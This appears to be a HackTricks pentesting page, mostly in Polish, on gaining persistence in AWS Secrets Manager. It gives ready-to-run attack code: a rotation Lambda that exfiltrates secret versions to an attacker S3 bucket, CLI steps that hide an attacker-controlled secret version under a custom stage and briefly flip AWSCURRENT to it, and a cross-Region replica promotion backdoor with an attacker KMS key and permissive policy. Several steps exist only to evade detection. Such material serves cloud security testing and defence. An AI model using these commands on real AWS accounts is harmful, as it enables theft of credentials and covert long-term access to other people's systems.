# AWS - Secrets Manager Persistence

{{#include ../../../../banners/hacktricks-training.md}}

## Secrets Manager

Po więcej informacji zobacz:

{{#ref}}
../../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Via Resource Policies

Możliwe jest **grant access to secrets to external accounts** poprzez resource policies. Sprawdź [**Secrets Manager Privesc page**](../../aws-privilege-escalation/aws-secrets-manager-privesc/README.md) po więcej informacji. Zwróć uwagę, że aby **access a secret**, zewnętrzne konto będzie również **need access to the KMS key encrypting the secret**.

### Via Secrets Rotate Lambda

Aby automatycznie **rotate secrets**, wywoływana jest skonfigurowana **Lambda**. Jeśli atakujący mógłby **change** the **code**, mógłby bezpośrednio **exfiltrate the new secret** do siebie.

This is how lambda code for such action could look like:
```python
import boto3

def rotate_secrets(event, context):
# Create a Secrets Manager client
client = boto3.client('secretsmanager')

# Retrieve the current secret value
secret_value = client.get_secret_value(SecretId='example_secret_id')['SecretString']

# Rotate the secret by updating its value
new_secret_value = rotate_secret(secret_value)
client.update_secret(SecretId='example_secret_id', SecretString=new_secret_value)

def rotate_secret(secret_value):
# Perform the rotation logic here, e.g., generate a new password

# Example: Generate a new password
new_secret_value = generate_password()

return new_secret_value

def generate_password():
# Example: Generate a random password using the secrets module
import secrets
import string
password = ''.join(secrets.choice(string.ascii_letters + string.digits) for i in range(16))
return password
```
### Zamień funkcję Lambda odpowiedzialną za rotację na funkcję kontrolowaną przez atakującego za pomocą RotateSecret

Wykorzystaj `secretsmanager:RotateSecret`, aby przepiąć secret do funkcji rotacyjnej kontrolowanej przez atakującego i wymusić natychmiastową rotację. Złośliwa funkcja eksfiltrowuje wersje secretu (AWSCURRENT/AWSPENDING) podczas kroków rotacji (createSecret/setSecret/testSecret/finishSecret) do miejsca exfiltracji atakującego (np. S3 lub zewnętrzny HTTP).

- Wymagania
- Uprawnienia: `secretsmanager:RotateSecret`, `lambda:InvokeFunction` na attacker Lambda, `iam:CreateRole/PassRole/PutRolePolicy` (lub AttachRolePolicy) do utworzenia roli wykonawczej Lambdy z `secretsmanager:GetSecretValue` i najlepiej `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage` (żeby rotacja nadal działała), KMS `kms:Decrypt` dla klucza KMS secretu, oraz `s3:PutObject` (lub ruch wychodzący) do eksfiltracji.
- Docelowy identyfikator secretu (`SecretId`) z włączoną rotacją lub możliwość włączenia rotacji.

- Wpływ
- Atakujący otrzymuje wartość(y) secretu bez modyfikowania oryginalnego kodu rotacji. Zmienia się jedynie konfiguracja rotacji, aby wskazywała na Lambda atakującego. Jeśli nie zostanie wykryte, zaplanowane przyszłe rotacje będą nadal wywoływać funkcję atakującego.

- Kroki ataku (CLI)
1) Przygotuj miejsce exfiltracji i rolę Lambda
- Utwórz bucket S3 do eksfiltracji oraz rolę wykonawczą zaufaną przez Lambda z uprawnieniami do odczytu secretu i zapisu do S3 (oraz logs/KMS w razie potrzeby).
2) Wdróż attacker Lambda, która w każdym kroku rotacji pobiera wartość(y) secretu i zapisuje je do S3. Minimalna logika rotacji może po prostu skopiować AWSCURRENT do AWSPENDING i promować ją w finishSecret, aby utrzymać usługę w dobrym stanie.
3) Przekieruj rotację i wyzwól
- `aws secretsmanager rotate-secret --secret-id <SECRET_ARN> --rotation-lambda-arn <ATTACKER_LAMBDA_ARN> --rotation-rules '{"ScheduleExpression":"rate(10 days)"}' --rotate-immediately`
4) Zweryfikuj eksfiltrację, listując prefiks S3 dla tego secretu i sprawdzając artefakty JSON.
5) (Opcjonalnie) Przywróć oryginalną funkcję rotacyjną Lambda, aby zmniejszyć wykrycie.

- Przykładowa Lambda atakującego (Python) eksfiltrująca do S3
- Środowisko: `EXFIL_BUCKET=<bucket>`
- Handler: `lambda_function.lambda_handler`
```python
import boto3, json, os, base64, datetime
s3 = boto3.client('s3')
sm = boto3.client('secretsmanager')
BUCKET = os.environ['EXFIL_BUCKET']

def write_s3(key, data):
s3.put_object(Bucket=BUCKET, Key=key, Body=json.dumps(data).encode('utf-8'), ContentType='application/json')

def lambda_handler(event, context):
sid, token, step = event['SecretId'], event['ClientRequestToken'], event['Step']
# Exfil both stages best-effort
def getv(**kw):
try:
r = sm.get_secret_value(**kw)
return {'SecretString': r.get('SecretString')} if 'SecretString' in r else {'SecretBinary': base64.b64encode(r['SecretBinary']).decode('utf-8')}
except Exception as e:
return {'error': str(e)}
current = getv(SecretId=sid, VersionStage='AWSCURRENT')
pending = getv(SecretId=sid, VersionStage='AWSPENDING')
key = f"{sid.replace(':','_')}/{step}/{token}.json"
write_s3(key, {'time': datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'), 'step': step, 'secret_id': sid, 'token': token, 'current': current, 'pending': pending})
# Minimal rotation (optional): copy current->pending and promote in finishSecret
# (Implement createSecret/finishSecret using PutSecretValue and UpdateSecretVersionStage)
```
### Version Stage Hijacking for Covert Persistence (custom stage + fast AWSCURRENT flip)

Wykorzystaj etykiety staging wersji w Secrets Manager, aby umieścić kontrolowaną przez atakującego wersję sekretu i ukryć ją pod niestandardowym stage (na przykład, `ATTACKER`), podczas gdy produkcja nadal korzysta z oryginalnego `AWSCURRENT`. W dowolnym momencie przestaw `AWSCURRENT` na wersję atakującego, aby zatruć zależne workloady, a następnie przywróć, by zminimalizować wykrycie. Zapewnia to dyskretną backdoor persystencję i szybką manipulację czasem użycia bez zmiany nazwy sekretu ani konfiguracji rotacji.

- Requirements
- Permissions: `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage`, `secretsmanager:DescribeSecret`, `secretsmanager:ListSecretVersionIds`, `secretsmanager:GetSecretValue` (for verification)
- Target secret id in the Region.

- Impact
- Utrzymuj ukrytą, kontrolowaną przez atakującego wersję sekretu i atomowo przestawiaj `AWSCURRENT` na nią na żądanie, wpływając na każdego konsumenta rozwiązującego tę samą nazwę sekretu. Przestawienie i szybkie przywrócenie zmniejszają szansę wykrycia, jednocześnie umożliwiając kompromitację w momencie użycia.

- Attack steps (CLI)
- Preparation
- `export SECRET_ID=<target secret id or arn>`

<details>
<summary>Polecenia CLI</summary>
```bash
# 1) Capture current production version id (the one holding AWSCURRENT)
CUR=$(aws secretsmanager list-secret-version-ids \
--secret-id "$SECRET_ID" \
--query "Versions[?contains(VersionStages, AWSCURRENT)].VersionId | [0]" \
--output text)

# 2) Create attacker version with known value (this will temporarily move AWSCURRENT)
BACKTOK=$(uuidgen)
aws secretsmanager put-secret-value \
--secret-id "$SECRET_ID" \
--client-request-token "$BACKTOK" \
--secret-string {backdoor:hunter2!}

# 3) Restore production and hide attacker version under custom stage
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"

aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage ATTACKER \
--move-to-version-id "$BACKTOK"

# Verify stages
aws secretsmanager list-secret-version-ids --secret-id "$SECRET_ID" --include-deprecated

# 4) On-demand flip to the attacker’s value and revert quickly
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$BACKTOK" \
--remove-from-version-id "$CUR"

# Validate served plaintext now equals the attacker payload
aws secretsmanager get-secret-value --secret-id "$SECRET_ID" --query SecretString --output text

# Revert to reduce detection
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"
```
</details>

- Uwagi
- Gdy podasz `--client-request-token`, Secrets Manager użyje go jako `VersionId`. Dodanie nowej wersji bez jawnego ustawienia `--version-stages` powoduje domyślne przeniesienie `AWSCURRENT` na nową wersję i oznaczenie poprzedniej jako `AWSPREVIOUS`.


### Cross-Region Replica Promotion Backdoor (replicate ➜ promote ➜ permissive policy)

Wykorzystaj multi-Region replication w Secrets Manager, aby stworzyć replikę docelowego secret w mniej monitorowanym Regionie, zaszyfrować ją kluczem KMS kontrolowanym przez atakującego w tym Regionie, następnie wypromować replikę do standalone secret i dołączyć permisywną resource policy przyznającą atakującemu dostęp do odczytu. Oryginalny secret w Regionie głównym pozostaje niezmieniony, co daje trwały, dyskretny dostęp do wartości secret przez wypromowaną replikę, omijając ograniczenia KMS/policy na źródłowym zasobie.

- Wymagania
- Uprawnienia: `secretsmanager:ReplicateSecretToRegions`, `secretsmanager:StopReplicationToReplica`, `secretsmanager:PutResourcePolicy`, `secretsmanager:GetResourcePolicy`, `secretsmanager:DescribeSecret`.
- W Regionie repliki: `kms:CreateKey`, `kms:CreateAlias`, `kms:CreateGrant` (lub `kms:PutKeyPolicy`) umożliwiające principalowi atakującego `kms:Decrypt`.
- An attacker principal (user/role) to receive read access to the promoted secret.

- Wpływ
- Trwała, międzyregionowa ścieżka dostępu do wartości secret poprzez niezależną replikę zabezpieczoną KMS CMK kontrolowanym przez atakującego oraz permisywną resource policy. Główny secret w oryginalnym Regionie pozostaje nietknięty.

- Attack (CLI)
- Vars
```bash
export R1=<primary-region>   # e.g., us-east-1
export R2=<replica-region>   # e.g., us-west-2
export SECRET_ID=<secret name or ARN in R1>
export ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
export ATTACKER_ARN=<arn:aws:iam::<ACCOUNT_ID>:user/<attacker> or role>
```
1) Utwórz kontrolowany przez atakującego klucz KMS w Regionie repliki
```bash
cat > /tmp/kms_policy.json <<'JSON'
{"Version":"2012-10-17","Statement":[
{"Sid":"EnableRoot","Effect":"Allow","Principal":{"AWS":"arn:aws:iam::${ACCOUNT_ID}:root"},"Action":"kms:*","Resource":"*"}
]}
JSON
KMS_KEY_ID=$(aws kms create-key --region "$R2" --description "Attacker CMK for replica" --policy file:///tmp/kms_policy.json \
--query KeyMetadata.KeyId --output text)
aws kms create-alias --region "$R2" --alias-name alias/attacker-sm --target-key-id "$KMS_KEY_ID"
# Allow attacker to decrypt via a grant (or use PutKeyPolicy to add the principal)
aws kms create-grant --region "$R2" --key-id "$KMS_KEY_ID" --grantee-principal "$ATTACKER_ARN" --operations Decrypt DescribeKey
```
2) Zreplikuj secret do R2, używając klucza KMS atakującego
```bash
aws secretsmanager replicate-secret-to-regions --region "$R1" --secret-id "$SECRET_ID" \
--add-replica-regions Region=$R2,KmsKeyId=alias/attacker-sm --force-overwrite-replica-secret
aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" | jq '.ReplicationStatus'
```
3) Promuj replikę na instancję samodzielną w R2
```bash
# Use the secret name (same across Regions)
NAME=$(aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" --query Name --output text)
aws secretsmanager stop-replication-to-replica --region "$R2" --secret-id "$NAME"
aws secretsmanager describe-secret --region "$R2" --secret-id "$NAME"
```
4) Dołącz permisywną politykę zasobów do samodzielnego secretu w R2
```bash
cat > /tmp/replica_policy.json <<JSON
{"Version":"2012-10-17","Statement":[{"Sid":"AttackerRead","Effect":"Allow","Principal":{"AWS":"${ATTACKER_ARN}"},"Action":["secretsmanager:GetSecretValue"],"Resource":"*"}]}
JSON
aws secretsmanager put-resource-policy --region "$R2" --secret-id "$NAME" --resource-policy file:///tmp/replica_policy.json --block-public-policy
aws secretsmanager get-resource-policy --region "$R2" --secret-id "$NAME"
```
5) Odczytaj secret od attacker principal w R2
```bash
# Configure attacker credentials and read
aws secretsmanager get-secret-value --region "$R2" --secret-id "$NAME" --query SecretString --output text
```
{{#include ../../../../banners/hacktricks-training.md}}
